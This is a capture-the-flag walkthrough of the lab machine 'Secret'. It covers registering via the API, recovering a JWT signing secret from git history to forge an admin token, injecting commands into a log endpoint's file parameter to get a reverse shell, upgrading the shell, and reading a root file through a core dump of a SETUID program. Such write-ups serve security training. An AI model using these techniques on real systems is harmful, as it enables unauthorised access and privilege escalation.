# Secret

* Found port 80 and 3000 open running an application

* Downloaded source code from the app

* Looks like i can curl and register a new user

```bash
curl -i -X POST http://10.10.11.120/api/user/register -H 'Content-Type: application/json' -d '{"name": "brun0test","email": "brun0@dasith.works","password": "password"}'
```

* Looks like when i login i get a jwt token

```bash
curl -i -X POST http://10.10.11.120/api/user/login -H 'Content-Type: application/json' -d '{"email": "brun0@dasith.works","password": "password"}'

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjBjMDQzNWFmMWQ3NDA0NWFkM2QyYWQiLCJuYW1lIjoiYnJ1bjB0ZXN0IiwiZW1haWwiOiJicnVuMEBkYXNpdGgud29ya3MiLCJpYXQiOjE2NDQ5NTQ3MzV9.BC84EumEfq6xymOBroweZ5GenENkkBX4GR7A8ZIkFiw
```

* Making a GET request to `/api/priv` retrivies that i am a normal user, need to elevate to admin

```bash
GET /api/priv/ HTTP/1.1
Host: 10.10.11.120
auth-token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjBjMDQzNWFmMWQ3NDA0NWFkM2QyYWQiLCJuYW1lIjoiYnJ1bjB0ZXN0IiwiZW1haWwiOiJicnVuMEBkYXNpdGgud29ya3MiLCJpYXQiOjE2NDQ5NTQ3MzV9.BC84EumEfq6xymOBroweZ5GenENkkBX4GR7A8ZIkFiw
```

* Tried various things but nothing worked ... found .git and checked git logs

* Found a log saying `deleted .env for security reasons` but the file is still there

* Using `git diff HEAD~2` I could check there is a token

```bash
-TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
+TOKEN_SECRET = secret
```

* So changing the jwt token with the new secret i could login

![image](https://user-images.githubusercontent.com/12052283/154136415-f68376a0-dc67-49c9-9fb0-ea78667db365.png)

* Going to `/api/logs` I find in the source code that this endpoint accepts a file param and execs a git command. Since its using exec I could try a rev shell

![image](https://user-images.githubusercontent.com/12052283/154137623-a9f02c0f-54ac-4a46-9548-06fdc91c40c0.png)

![image](https://user-images.githubusercontent.com/12052283/154137820-68ed8bbd-dc5a-4828-b89f-f2ff368ddab2.png)

* Got RCE in the file param

![image](https://user-images.githubusercontent.com/12052283/154138342-cdc6c21f-5902-4683-a3c2-719b3a6a7878.png)

* Using a rev shell url encoded instead of `cat /etc/passwd` got a rev shell

* Upgraded shell doing `python3 -c 'import pty;pty.spawn("/bin/bash")'` then `Ctrl Z` then `stty raw - echo` then `fg` and then `export TERM=xterm`

* linPEAS was not helpfull so I found interesting files in `/opt`

* The code in `/opt/code.c` shows that when iterating trough files and folders we have SETUID and when those two functions finish we go down again to no SETUID so I have to use `/root/root.txt` to read that file content . Tried with gdb but using gdb the SETUID is disabled i guess

* The other way around is to execute the program, Ctrl Z , kill the process, fg to generate a core dump. Then I need to go to /var/crashes and unpack using `apport-unpack` to view the data. The flag will be in the `CoreDump` file

